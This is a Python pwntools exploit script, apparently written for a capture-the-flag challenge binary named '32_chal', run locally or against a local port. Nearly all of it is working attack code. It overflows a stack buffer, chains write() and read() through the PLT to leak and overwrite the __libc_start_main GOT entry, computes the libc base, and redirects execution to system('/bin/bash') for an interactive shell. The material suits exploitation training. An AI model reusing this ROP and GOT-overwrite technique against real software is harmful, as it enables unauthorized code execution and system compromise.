from pwn import *
import time

#defult setting and find address
target = "./32_chal"
local = True
HOST = '127.0.0.1'
PORT = 40645

target_bin = ELF(target)
libc = ELF('./libc.so.6')

pop3ret = 0x0804853d
__libc_start_main_rel = libc.symbols['__libc_start_main'] 
system_rel = libc.symbols['system'] 

#check target
if local:
    conn = process(target, env = {"LD_PRELOAD":"./libc.so.6"})
#conn = process(target)
else:
    conn = remote(HOST, PORT)

#Setting Enable Environment
# context
context.update(arch='i386', os='linux')
context.clear(arch=target_bin.arch)
context.log_level = 'debug' 
#log_level must be one of ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['terminal', '-x', 'sh', '-c']
#context.terminal = ['tmux', 'splitw', '-h']

gdb.attach(conn)
#Attack~~~!!!
#simple BoF... dummy of local area
Payload = "A" * (100+4*3)

# write(1, __libc_start_main_got, 4)
Payload += p32(target_bin.plt['write'])
Payload += p32(pop3ret)
Payload += p32(1)
Payload += p32(target_bin.got['__libc_start_main'])
Payload += p32(4)

# read(0, __libc_start_main_got, 20)
Payload += p32(target_bin.plt['read'])
Payload += p32(pop3ret)
Payload += p32(0)
Payload += p32(target_bin.got['__libc_start_main'])
Payload += p32(20)

# system('/bin/sh')
Payload += p32(target_bin.plt['__libc_start_main'])
Payload += p32(0xBBBB)
Payload += p32(target_bin.got['__libc_start_main']+4)


print conn.recvuntil("pwners, \n")
conn.sendline(Payload)
print conn.recv() #print AAAA

# Calculation addr
__libc_start_main_addr = u32(conn.recv(4))
print "libc_start_main_addr:{}".format(hex(__libc_start_main_addr))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/bash\x00")
print "system_base:{}".format(hex(system_addr))
time.sleep(0.1)

conn.interactive()
